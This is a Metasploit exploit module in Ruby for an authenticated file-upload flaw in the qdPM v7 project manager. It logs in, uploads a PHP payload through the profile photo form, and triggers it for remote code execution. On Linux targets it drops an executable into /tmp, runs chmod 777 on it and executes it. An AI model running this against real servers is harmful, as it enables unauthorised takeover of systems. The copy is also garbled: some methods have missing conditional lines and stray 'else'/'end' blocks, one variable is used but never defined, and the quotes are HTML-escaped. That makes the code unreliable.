# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "qdPM v7 Arbitrary PHP File Upload Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in qdPM - a web-based project management
        software. The user profile&#039;s photo upload feature can be abused to upload any
        arbitrary file onto the victim server machine, which allows remote code execution.
        Please note in order to use this module, you must have a valid credential to sign
        in.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;loneferret&#039;, #Discovery, PoC
          &#039;sinn3r&#039;      #Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;82978&#039;],
          [&#039;EDB&#039;, &#039;19154&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00"
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "none"
        },
      &#039;Platform&#039;       => [&#039;linux&#039;, &#039;php&#039;],
      &#039;Targets&#039;        =>
        [
          [ &#039;Generic (PHP Payload)&#039;, { &#039;Arch&#039; => ARCH_PHP, &#039;Platform&#039; => &#039;php&#039; }  ],
          [ &#039;Linux x86&#039;            , { &#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;linux&#039;} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Jun 14 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base directory to sflog!&#039;, &#039;/qdPM/&#039;]),
        OptString.new(&#039;USERNAME&#039;,  [true, &#039;The username to login with&#039;]),
        OptString.new(&#039;PASSWORD&#039;,  [true, &#039;The password to login with&#039;])
      ], self.class)
  end

  def check
    target_uri.path << &#039;/&#039; if target_uri.path[-1,1] != &#039;/&#039;
    base = File.dirname("#{target_uri.path}.")

    res = send_request_raw({&#039;uri&#039;=>"#{base}/index.php"})
    if res and res.body =~ /<div id\=\"footer\"\>.+qdPM ([\d])\.([\d]).+\<\/div\>/m
      major, minor = $1, $2
      return Exploit::CheckCode::Vulnerable if (major+minor).to_i <= 70
    end

    return Exploit::CheckCode::Safe
  end

  def get_write_exec_payload(fname, data)
    p = Rex::Text.encode_base64(generate_payload_exe)
    php = %Q|
    <?php
    $f = fopen("#{fname}", "wb");
    fwrite($f, base64_decode("#{p}"));
    fclose($f);
    exec("chmod 777 #{fname}");
    exec("#{fname}");
    ?>
    |
    php = php.gsub(/^\t\t/, &#039;&#039;).gsub(/\n/, &#039; &#039;)
    return php
  end

  def on_new_session(cli)
      cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
    end

    @clean_files.each do |f|
      print_status("#{@peer} - Removing: #{f}")
      begin
          cli.fs.file.rm(f)
        else
          cli.shell_command_token("rm #{f}")
        end
      rescue ::Exception => e
        print_error("#{@peer} - Unable to remove #{f}: #{e.message}")
      end
    end
  end

  def login(base, username, password)
    # Login
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => "#{base}/index.php/home/login",
      &#039;vars_post&#039; => {
        &#039;login[email]&#039;    => username,
        &#039;login[password]&#039; => password,
        &#039;http_referer&#039;    => &#039;&#039;
      },
      # This needs to be set, otherwise we get two cookies... I don&#039;t need two cookies.
      &#039;cookie&#039;     => "qdpm=#{Rex::Text.rand_text_alpha(27)}",
      &#039;headers&#039;   => {
        &#039;Origin&#039; => "http://#{rhost}",
        &#039;Referer&#039; => "http://#{rhost}/#{base}/index.php/home/login"
      }
    })

    cookie = (res and res.headers[&#039;Set-Cookie&#039;] =~ /qdpm\=.+\;/) ? res.headers[&#039;Set-Cookie&#039;] : &#039;&#039;
    return {} if cookie.empty?
    cookie = cookie.to_s.scan(/(qdpm\=\w+)\;/).flatten[0]

    # Get user data
    vprint_status("#{@peer} - Enumerating user data")
    res = send_request_raw({
      &#039;uri&#039; => "#{base}/index.php/home/myAccount",
      &#039;cookie&#039; => cookie
    })

    return {} if not res
    if res.code == 404
      print_error("#{@peer} - #{username} does not actually have a &#039;myAccount&#039; page")
      return {}
    end

    b = res.body

    user_id = b.scan(/\<input type\=\"hidden\" name\=\"users\[id\]\" value\=\"(.+)\" id\=\"users\_id\" \/\>/).flatten[0] || &#039;&#039;
    group_id = b.scan(/\<input type\=\"hidden\" name\=\"users\[users\_group\_id\]\" value\=\"(.+)\" id\=\"users\_users\_group\_id\" \/>/).flatten[0] || &#039;&#039;
    user_active = b.scan(/\<input type\=\"hidden\" name\=\"users\[active\]\" value\=\"(.+)\" id\=\"users\_active\" \/\>/).flatten[0] || &#039;&#039;

    opts = {
      &#039;cookie&#039;     => cookie,
      &#039;user_id&#039;     => user_id,
      &#039;group_id&#039;    => group_id,
      &#039;user_active&#039; => user_active
    }

    return opts
  end

  def upload_php(base, opts)
    fname       = opts[&#039;filename&#039;]
    php_payload = opts[&#039;data&#039;]
    user_id     = opts[&#039;user_id&#039;]
    group_id    = opts[&#039;group_id&#039;]
    user_active = opts[&#039;user_active&#039;]
    username    = opts[&#039;username&#039;]
    email       = opts[&#039;email&#039;]
    cookie      = opts[&#039;cookie&#039;]

    data = Rex::MIME::Message.new
    data.add_part(&#039;UsersAccountForm&#039;, nil, nil, &#039;form-data; name="formName"&#039;)
    data.add_part(&#039;put&#039;, nil, nil, &#039;form-data; name="sf_method"&#039;)
    data.add_part(user_id, nil, nil, &#039;form-data; name="users[id]"&#039;)
    data.add_part(group_id, nil, nil, &#039;form-data; name="users[users_group_id]"&#039;)
    data.add_part(user_active, nil, nil, &#039;form-data; name="users[active]"&#039;)
    data.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="users[skin]"&#039;)
    data.add_part(username, nil, nil, &#039;form-data; name="users[name]"&#039;)
    data.add_part(php_payload, nil, nil, "form-data; name=\"users[photo]\"; filename=\"#{fname}\"")
    data.add_part(email, nil, nil, &#039;form-data; name="users[email]"&#039;)
    data.add_part(&#039;en_US&#039;, nil, nil, &#039;form-data; name="users[culture]"&#039;)
    data.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="new_password"&#039;)

    post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)

    res = send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => "#{base}/index.php/home/myAccount",
      &#039;ctype&#039;   => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;    => post_data,
      &#039;cookie&#039;  => cookie,
      &#039;headers&#039; => {
        &#039;Origin&#039; => "http://#{rhost}",
        &#039;Referer&#039; => "http://#{rhost}#{base}/index.php/home/myAccount"
      }
    })

    return (res and res.headers[&#039;Location&#039;] =~ /home\/myAccount$/) ? true : false
  end

  def exec_php(base, opts)
    cookie = opts[&#039;cookie&#039;]

    # When we upload a file, it will be renamed. The &#039;myAccount&#039; page has that info.
    res = send_request_cgi({
      &#039;uri&#039;    => "#{base}/index.php/home/myAccount",
      &#039;cookie&#039; => cookie
    })

    if not res
      print_error("#{@peer} - Unable to request the file")
      return
    end

    if fname.empty?
      print_error("#{@peer} - Unable to extract the real filename")
      return
    end

    # Now that we have the filename, request it
    print_status("#{@peer} - Uploaded file was renmaed as &#039;#{fname}&#039;")
    send_request_raw({&#039;uri&#039;=>"#{base}/uploads/users/#{fname}"})
    handler
  end

  def exploit
    @peer = "#{rhost}:#{rport}"

    target_uri.path << &#039;/&#039; if target_uri.path[-1,1] != &#039;/&#039;
    base = File.dirname("#{target_uri.path}.")

    user = datastore[&#039;USERNAME&#039;]
    pass = datastore[&#039;PASSWORD&#039;]
    print_status("#{@peer} - Attempt to login with &#039;#{user}:#{pass}&#039;")
    opts = login(base, user, pass)
    if opts.empty?
      print_error("#{@peer} - Login unsuccessful")
      return
    end

    php_fname = "#{Rex::Text.rand_text_alpha(5)}.php"
    @clean_files = [php_fname]

    case target[&#039;Platform&#039;]
    when &#039;php&#039;
      p = "<?php #{payload.encoded} ?>"
    when &#039;linux&#039;
      bin_name = "#{Rex::Text.rand_text_alpha(5)}.bin"
      @clean_files << bin_name
      bin = generate_payload_exe
      p = get_write_exec_payload("/tmp/#{bin_name}", bin)
    end

    print_status("#{@peer} - Uploading PHP payload (#{p.length.to_s} bytes)...")
    opts = opts.merge({
      &#039;username&#039; => user.scan(/^(.+)\@.+/).flatten[0] || &#039;&#039;,
      &#039;email&#039;    => user,
      &#039;filename&#039; => php_fname,
      &#039;data&#039;     => p
    })
    uploader = upload_php(base, opts)
    if not uploader
      print_error("#{@peer} - Unable to upload")
      return
    end

    print_status("#{@peer} - Executing &#039;#{php_fname}&#039;")
    exec_php(base, opts)
  end
end



